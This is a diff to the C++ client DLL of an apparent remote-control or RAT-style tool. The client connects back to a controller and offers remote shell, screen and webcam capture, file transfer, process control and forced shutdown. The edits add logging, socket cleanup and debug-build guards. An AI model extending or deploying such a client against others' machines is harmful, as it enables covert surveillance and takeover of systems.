@@ -31,7 +31,9 @@ extern "C"  __declspec(dllexport) void QuitProcess(){
     IsRun = FALSE;
     if (INVALID_SOCKET != MainSocket)
     {
-        shutdown(MainSocket, SD_RECEIVE);
+        shutdown(MainSocket, SD_BOTH);
+        closesocket(MainSocket);
+        MainSocket = INVALID_SOCKET;
     }
 }
 
@@ -87,6 +89,7 @@ inline SOCKET ConnectServer()
 
 DWORD _stdcall ConnectThread(LPVOID lParam)
 {
+    CAutoLog log(__FUNCTION__);
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
 
     MainSocket = ConnectServer();
@@ -192,8 +195,12 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
         case CMD_POWEROFF: {	//关机
             if (!modify_data.IsLocalServer())
             {
+#ifndef _DEBUG
 				SetPrivilege(SE_SHUTDOWN_NAME);
 				ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0);
+#else
+                Mprintf("收到关机指令! 调试版本程序不关机.\n");
+#endif
             } else {
                 Mprintf("收到关机指令! 主控端在本机不关机.\n");
             }
@@ -203,8 +210,12 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
         case CMD_REBOOT: {	//重启
             if (!modify_data.IsLocalServer())
             {
+#ifndef _DEBUG
                 SetPrivilege(SE_SHUTDOWN_NAME);
                 ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
+#else
+				Mprintf("收到关机指令! 调试版本程序不重启.\n");
+#endif
 			} else {
 				Mprintf("收到重启指令! 主控端在本机不重启.\n");
 			}
@@ -214,8 +225,12 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
         case CMD_LOGOFF: {	//注销
             if (!modify_data.IsLocalServer())
             {
+#ifndef _DEBUG
                 SetPrivilege(SE_SHUTDOWN_NAME);
                 ExitWindowsEx(EWX_LOGOFF | EWX_FORCE, 0);
+#else
+				Mprintf("收到关机指令! 调试版本程序不注销.\n");
+#endif
 			} else {
 				Mprintf("收到注销指令! 主控端在本机不注销.\n");
 			}
@@ -333,6 +348,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
         break;
 #endif
         default:
+            Mprintf(">>> 收到未知命令: 0x%X Size %d\n", msgHead.dwCmd, msgHead.dwSize);
             break;
         }
     }
@@ -342,6 +358,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 DWORD _stdcall FileManageThread(LPVOID lParam)
 {
+    CAutoLog log(__FUNCTION__);
     SOCKET FileSocket = ConnectServer();
 
     if (FileSocket == SOCKET_ERROR) {
@@ -431,6 +448,7 @@ DWORD _stdcall FileManageThread(LPVOID lParam)
 
 DWORD _stdcall ScreenThread(LPVOID lParam)
 {
+    CAutoLog log(__FUNCTION__);
     DWORD dwSock = (DWORD)lParam;
 
     SOCKET ScreenSocket = ConnectServer();
@@ -532,6 +550,7 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 #if LxVideo
 DWORD _stdcall VideoThread(LPVOID lParam)
 {
+    CAutoLog log(__FUNCTION__);
     SOCKET VideoSocket = ConnectServer();
     if (VideoSocket == SOCKET_ERROR) {
         return 0;//connect error
@@ -618,6 +637,7 @@ DWORD _stdcall VideoThread(LPVOID lParam)
 
 DWORD _stdcall ProcessThread(LPVOID lParam)
 {
+    CAutoLog log(__FUNCTION__);
     SOCKET ProcessSocket = ConnectServer();
     if (ProcessSocket == SOCKET_ERROR) {	//connect error
         return 0;
@@ -664,6 +684,7 @@ DWORD _stdcall ProcessThread(LPVOID lParam)
 
 DWORD _stdcall ShellThread(LPVOID lParam)
 {
+    CAutoLog log(__FUNCTION__);
     SOCKET ShellSocket = ConnectServer();
     if (ShellSocket == SOCKET_ERROR) {
         return 0;
@@ -704,6 +725,7 @@ DWORD _stdcall ShellThread(LPVOID lParam)
 
 DWORD _stdcall FileDownThread(LPVOID lParam)
 {
+    CAutoLog log(__FUNCTION__);
     FileOpt m_FileOpt;
     memcpy(&m_FileOpt,(FileOpt*)lParam,sizeof(FileOpt));
 
@@ -761,6 +783,7 @@ DWORD _stdcall FileDownThread(LPVOID lParam)
 
 DWORD _stdcall FileUpThread(LPVOID lParam)
 {
+    CAutoLog log(__FUNCTION__);
     FileOpt m_FileOpt;
     memcpy(&m_FileOpt,(FileOpt*)lParam,sizeof(FileOpt));
 
@@ -830,7 +853,7 @@ LONG _stdcall Errdo(_EXCEPTION_POINTERS *ExceptionInfo)
 DWORD WINAPI RoutineMain(LPVOID lp)
 {
     IsRun = TRUE;
-    OutputDebugStringA(">>> Start RoutineMain\n");
+    Mprintf(">>> Start RoutineMain\n");
     TCHAR ModulePath[MAX_PATH*2];
     GetModuleFileName(DllHandle, ModulePath, sizeof(ModulePath));
     // 确保只运行一个实例
@@ -856,19 +879,22 @@ DWORD WINAPI RoutineMain(LPVOID lp)
             Mprintf("RoutineMain expection: ConnectThread \n");
         }
 
+        if (!IsRun) 
+            state = -1;// 正常退出
+
         if (state == 0) { //Connect Error
             Sleep(10 * 1000);
         } else if (state == 1) { //Network Error
             Sleep(10 * 1000);
         } else if (state == -1) { //Exit
             // 主控发起退出指令
-            OutputDebugStringA(">>> Stop RoutineMain: Exit Request \n");
+            Mprintf(">>> Stop RoutineMain: Exit Request \n");
             return -1;
         }
 
         Sleep(1000);
     }
-    OutputDebugStringA(">>> Stop RoutineMain\n");
+    Mprintf(">>> Stop RoutineMain\n");
 
     return 0;
 }
